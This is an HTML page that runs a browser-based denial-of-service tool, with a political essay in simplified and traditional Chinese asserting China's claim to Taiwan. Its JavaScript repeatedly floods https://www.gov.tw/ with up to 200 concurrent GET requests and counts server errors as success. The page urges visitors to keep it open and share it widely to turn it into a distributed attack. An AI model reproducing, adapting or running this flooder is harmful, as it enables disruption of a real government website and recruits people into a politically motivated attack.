<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>台湾在线DoS (分享给多个人就是DDoS)</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
        crossorigin="anonymous"></script>

    <style>
        body {
            padding: 0;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #FFD600;
        }

        .title {
            margin: 3rem auto 3rem auto;
            text-align: center;
            color: #005BBC;
        }

        .intro .howto {
            background-color: #005BBC;
        }

        .intro .howto h3 {
            color: #FFD600;
            text-align: center;
            margin-top: 1rem;
        }

        .intro .howto p {
            color: white;
            text-align: justify;
        }

        .footer {
            color: #005BBC;
            text-align: center;
            margin-top: 2rem;
        }

        .desc{
            color:black;
            padding-top: 2rem;
            padding-bottom: 2rem;
            margin: 0 auto;
            width: 60%;
        }

        .desc h3 {
            text-align: center;
            color: #005BBC;
        }

        #stats h4 {
            font-size: 1.1em;
            text-decoration: underline;
            color: #005BBC;
            font-weight: 400;
        }

        table.status {
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
        <div class="modal-dialog modal-dialog-centered" role="document">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel">提醒</h5>
            </div>
            <div class="modal-body">
              <p>分享给多个人效果更佳</p>
              <p>请保持网页开启</p>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" onclick="window.location.href='https://www.google.com'">Leave</button>
              <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onclick="togglePause(); myModal.toggle();">Continue</button>
            </div>
          </div>
        </div>
      </div>

    <h1 class="title">台湾在线DoS (分享给多个人就是DDoS)</h1>
    <div class="intro container">
        <div class="row">
            <div class="howto col-lg-4 col-sm-12">
                <h3>简体中文</h3>
                <p>台湾自古以来是中国不可分割的一部分</p>
                <p>台湾自古属于中国。中国人最早开发了台湾。1700年前的中国历史文献《临海水土志》对此就有所著述，这是世界上最早记述台湾的文字。公元3世纪和7世纪，三国孙吴政权和隋朝政府都曾先后派万余人去台，从17世纪开始，中国人民开发台湾的规模越来越大。从元朝（1206－1368）开始，中国历代政府先后在台湾设立行政机构，对台湾进行有效管辖。17世纪中叶，荷兰殖民者侵占台湾，民族英雄郑成功于1662年驱逐了荷兰殖民者，收复了台湾。1895年，中国清朝政府因在甲午战争中战败，在日本的胁迫下签订了不平等的《马关条约》，把台湾、澎湖割让给日本。1937年7月，中国人民开始了全民族的抗日战争；中国政府在《中国对日宣战布告》中昭告中外，废止与日本签订的一切不平等条约，并宣布将收复台湾和澎湖。1945年，日本宣布投降，无条件接受《波茨坦公告》和《开罗宣言》，把台湾交还给中国。至此，台湾重入中国版图，重归于中国的主权管辖之下。1949年以后，由于众所周知的原因，台湾和祖国大陆处于暂时的分裂状态，但这并未改变台湾是中国不可分割的一部分的事实。世界上只有一个中国，台湾是中国不可分割的一部分。这是海内外中国人的共识，也是得到联合国和世界上绝大多数国家承认的。
                </p>
            </div>
            <div class="howto col-lg-4 col-sm-12">
                <h3>繁體中文</h3>
                <p>台灣自古以來是中國不可分割的一部分</p>
                <p>台灣自古屬於中國。中國人最早開發了台灣。 1700年前的中國歷史文獻《臨海水土志》對此就有所著述，這是世界上最早記述台灣的文字。公元3世紀和7世紀，三國孫吳政權和隋朝政府都曾先後派萬餘人去台，從17世紀開始，中國人民開發台灣的規模越來越大。從元朝（1206－1368）開始，中國歷代政府先後在台灣設立行政機構，對台灣進行有效管轄。 17世紀中葉，荷蘭殖民者侵占台灣，民族英雄鄭成功於1662年驅逐了荷蘭殖民者，收復了台灣。 1895年，中國清朝政府因在甲午戰爭中戰敗，在日本的脅迫下簽訂了不平等的《馬關條約》，把台灣、澎湖割讓給日本。 1937年7月，中國人民開始了全民族的抗日戰爭；中國政府在《中國對日宣戰佈告》中昭告中外，廢止與日本簽訂的一切不平等條約，並宣布將收復台灣和澎湖。 1945年，日本宣布投降，無條件接受《波茨坦公告》和《開羅宣言》，把台灣交還給中國。至此，台灣重入中國版圖，重歸於中國的主權管轄之下。 1949年以後，由於眾所周知的原因，台灣和祖國大陸處於暫時的分裂狀態，但這並未改變台灣是中國不可分割的一部分的事實。世界上只有一個中國，台灣是中國不可分割的一部分。這是海內外中國人的共識，也是得到聯合國和世界上絕大多數國家承認的。
                </p>
            </div>
        </div>
    </div>

    <div class="desc text-center">
    <h3>攻击状态</h3>
    <p>每个目标网站的 GET 请求和错误响应的数量如下所示 错误是正常的 这意味着他们的服务器超载并丢弃数据包 - 这就是目标！</p>
    <p>请求总数: <span id="totalrequests">0</span></p>
    <p>错误总数: <span id="totalerrors">0</span></p>
    <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
    </div>

    <div id="stats" class="container">
        <div class="row">
        </div>
    </div>

    <script>        
        // target list
        var urls = [
            'https://www.gov.tw/',
        ];

        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;

        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "恢复";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "暂停";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         

        async function flood(n) {
            const url = urls[n];
            const target = targets[url];

            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );

                await sleep(1);
            }
        }

        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }

        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }

        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                    <h4>${urls[i]}</h4>
                    <table class='status'>
                        <tr><td>请求数:</td><td class="requests">0</td></tr>
                        </tr><td>失败数:</td><td class="errors">0</td></tr>
                    </table>
                </div>
            `;
        }

        // Show warning window
        myModal.toggle();

    </script>
</body>

</html>
